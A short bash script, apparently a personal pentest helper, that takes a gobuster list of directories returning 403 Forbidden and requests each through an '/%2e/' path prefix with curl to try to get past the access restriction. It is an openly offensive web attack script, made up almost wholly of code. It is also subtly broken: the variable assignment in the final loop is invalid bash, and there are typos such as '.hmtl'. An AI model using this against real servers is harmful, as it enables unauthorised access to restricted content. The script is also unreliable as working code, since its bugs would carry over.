#! /bin/bash
printf "\n"

#check for argument
if [[ $# -lt 1 ]];then
	printf "[-] Please specify an URL \n"
	exit 1 #exit the script
fi

#gobuster scan
#printf "[+] running gobuster on $1\n"
#gobuster dir -q -u $1 -w /usr/share/wordlists/dirb/big.txt -t 10 -x .php,.xml,.hmtl,.txt -o dirs.txt -s 403
printf "[+] result: \n"
cat dirs.txt
printf "\n"


#select 403 forbidden
printf "[+] Preparing URLs for attack\n"
printf "\n"
for url in $(cat dirs.txt);do
	#urls directory must be present
	printf "$url" > urls/$url
done
#rm urls/'(Status'
#rm urls/'403)'
printf "[+] URL's are prepared\n!"
printf "\n"
for file in $(ls urls | grep -v "403\|Status");do
	$testurl = "http://$1/%2e/$file"
	curl -XGET $testurl
done


